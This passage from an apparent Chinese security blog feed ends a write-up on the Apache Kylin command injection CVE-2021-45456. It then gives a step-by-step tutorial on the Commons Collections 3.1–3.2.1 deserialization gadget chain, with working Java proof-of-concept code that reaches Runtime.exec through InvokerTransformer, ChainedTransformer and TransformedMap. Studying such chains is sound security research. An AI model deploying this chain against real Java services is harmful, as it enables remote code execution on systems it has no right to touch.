src="https://user-images.githubusercontent.com/63966847/149534727-a5264b5f-6dce-496d-bccd-90e6e0b4e392.png" alt="image-20220114223350119"></p><p>可以看到传递的是json格式然后去获得name，并且通过isAlphanumericUnderscore判断了，但是如果执行命令肯定set进去的name是 <strong>tuoch123</strong>，巧的是 <strong>tuoch123</strong>刚刚好去绕过。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534845-842825f1-95ee-4028-a70c-d7d63f9651d2.png" alt="image-20220114223924151"></p><p><img src="https://user-images.githubusercontent.com/63966847/149534827-4f56fa4c-6fb9-4a8f-bfd3-2b798e8ab042.png" alt="image-20220114223911294"></p><p>从而成功执行命令。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>y4er师傅的图</p><p>先创建项目名</p><p><img src="https://user-images.githubusercontent.com/63966847/149534861-95093753-4e7f-4b8d-a552-7218ac5ce038.png" alt="image-20220114224040087"></p><p>执行命令</p><p><img src="https://user-images.githubusercontent.com/63966847/149534871-c0d29304-c9ca-43b5-b2ac-6abae59abe52.png" alt="image-20220114224119476"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="https://user-images.githubusercontent.com/63966847/149534884-ff61e395-b5bc-4c97-94a3-3f07b3105f53.png" alt="image-20220114224356250"></p><p>传入cmd的参数改为projectName而非http传入的project，projectName经过convertStringToBeAlphanumericUnderscore() 处理，所以无法输入非字母数字下划线的字符来触发命令执行。</p><p>(除非单个命令可以创成严重危害。。。。。</p>]]></content>
    
    
    <summary type="html">CVE-2021-45456 Apache Kylin 命令注入</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollection利用链</title>
    <link href="http://example.com/2022/11/10/CommonsCollections/"/>
    <id>http://example.com/2022/11/10/CommonsCollections/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:52:02.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections利用链"><a href="#CommonsCollections利用链" class="headerlink" title="CommonsCollections利用链"></a>CommonsCollections利用链</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection（集合）</code>相关类对象。</p><p>在<code>Commons Collections</code>中实现了一个<code>TransformedMap类</code>，该类是对 Java 标准数据结构类型<code>Map</code>接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变化，而具体的变换逻辑则由<code>Transformer</code>类定义，<code>Transformer</code>在<code>TransformedMap</code>实例化时作为参数传入。</p><p>本条链子的利用版本限制：<code>CommonsCollections 3.1 - 3.2.1</code></p><h2 id="接口类和实现类"><a href="#接口类和实现类" class="headerlink" title="接口类和实现类"></a>接口类和实现类</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>Transformer</code>是一个接口类，其功能是提供一个对象转换方法<code>transform</code>，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="comment">// 将输入对象保持不变的转换为某个输出对象</span></span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现<code>Transformer</code>接口的类有以下类<br><img src="images/image-20220830225100395.png" alt="image-20220830225100395"></p><p>其中一些实现和调用<code>Transformer</code>接口的重要类为：<code>ConstantTransformer</code>、<code>invokerTransformer</code>、<code>ChainedTransformer</code>和<code>TransformedMap</code>。</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><code>ConstantTransformer</code>类是<code>Transformer</code>接口其中的一个实现类，<code>ConstantTransformer</code>类重写了<code>transformer</code>方法，源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>((Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="literal">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的对象不会经过任何改变进行返回，也就是当调用<code>transform</code>方法时会返回构造函数中传入的对象。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj);</span><br><span class="line">        System.out.println(constantTransformer.transform(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220901103831836.png" alt="image-20220901103831836"></p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>类在<code>Collections</code>组件中非常重要，也是我们后面构造 exp 的核心类。<code>InvokerTransformer</code>类的<code>transform</code>方法实现了类方法的动态调用，采用反射机制动态调用类方法（发射方法名、参数值可控）并返回该方法执行结果。该部分代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">  <span class="comment">// 要调用的方法名称</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">  <span class="comment">// 反射参数类型数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">  <span class="comment">// 反射参数值数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="comment">//异常处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>InvokerTransformer</code>类实现命令执行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">        );</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220901105358610.png" alt="image-20220901105358610"></p><p>在现实场景下很难通过<code>InvokerTransformer.transform</code>传入<code>Runtime.getRuntime()</code>对象完成命令执行，因此我们需要学习下一个接口实现类<code>ChainedTransformer</code>来构造我们的攻击链。</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><code>ChainedTransformer</code>类封装了<code>Transformer</code>的链式调用，当传入一个<code>Transformer</code>数组时，<code>ChainedTransformer</code>就会依次调用每一个<code>Transformer</code>的<code>transform</code>方法，关键源码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>贴一张 P 牛画的图<br><img src="images/img.png" alt="img"></p><p>通过<code>ChainedTransformer</code>类实现命令执行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transformer</span> <span class="operator">=</span> chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220903222648532.png" alt="image-20220903222648532"></p><p>先对上述的<code>poc</code>做一个分析：</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class)</span><br></pre></td></tr></table></figure><p>传入的<code>java.lang.Runtime</code>类原封不动的返回并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中<br><img src="images/image-20220904212600633.png" alt="image-20220904212600633"></p><p><strong>InvokerTransformer 1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br></pre></td></tr></table></figure><p>通过<code>InvokerTransformer</code>类的<code>transform()</code>方法里的反射，获取到<code>java.lang.Runtime</code>类的<code>getMethod()</code>方法并执行<code>getRuntime()</code>方法<br><img src="images/image-20220904213709408.png" alt="image-20220904213709408"></p><p>最后返回<code>java.lang.Runtime.getRuntime()</code>方法并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中</p><p><strong>InvokerTransformer 2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure><p><img src="images/image-20220904230545177.png" alt="image-20220904230545177"></p><p>传入的<code>Method</code>对象通过<code>getClass()</code>获取到反射类<code>java.lang.reflect.Method</code>，接着通过反射获取到<code>invoke()</code>方法执行传入的<code>java.lang.Runtime.getRuntime()</code>方法，返回<code>Runtime</code>对象并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中</p><p>这里比较有趣的是在最后执行<code>method.invoke(input,null)</code>时代入参数是<code>invoke.invoke(input,null)</code>的形式，依然能执行命令。</p><p><strong>InvokerTransformer 3</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure><p><img src="images/image-20220904232209075.png" alt="image-20220904232209075"></p><p>传入的<code>Runtime</code>实例通过<code>getClass()</code>获取到<code>Runtime</code>类，接着通过反射获取到<code>exec()</code>方法，最后通过<code>invoke()</code>执行传进来的<code>iArgs</code>命令</p><p>至此通过<code>ChainedTransformer</code>类，把<code>ConstantTransformer</code>类和多个<code>InvokerTransformer</code>类实现的<code>transform</code>方法一一执行，完成命令执行的利用链。</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>上述虽然构造了一串巧妙的命令执行利用链，但是仍然遗留下未解决的问题：需要转换对象成<code>ChainedTransformer</code>类型接着执行<code>transform()</code>方法<br><img src="images/image-20220905223858552.png" alt="image-20220905223858552"></p><p>所以我们需要解决以下问题：</p><ol><li>传入恶意的<code>ChainedTransformer</code>类</li><li>调用<code>ChainedTransformer</code>类创建的对象<code>chainedTransformer</code>的<code>transformer()</code>方法执行命令</li></ol><p>这里引入<code>TransformedMap</code>类，<code>org.apache.commons.collections.map.TransformedMap</code>类间接的实现了<code>java.util.Map</code>接口，同时支持对<code>Map</code>的<code>key</code>或者<code>value</code>进行<code>Transformer</code>转换，通过调用<code>decorate()</code>和<code>decorateTransform()</code>方法都可以进入<code>TransformedMap()</code>构造函数<br><img src="images/image-20220913165342046.png" alt="image-20220913165342046"></p><p>可以看到在<code>TransformedMap</code>类中通过<code>checkSetValue()</code>、<code>put()</code>和<code>putAll()</code>方法都可以调用传进来的<code>Transform</code>类（例如<code>InvokerTransformer</code>）的<code>transform()</code>方法<br><img src="images/image-20220913173832979.png" alt="image-20220913173832979"></p><p><img src="images/image-20220913180215864.png" alt="image-20220913180215864"></p><p>POC 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历Map元素，并调用setValue方法</span></span><br><span class="line">        <span class="keyword">for</span>(Object obj: transformedMap.entrySet())&#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line">            entry.setValue(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">   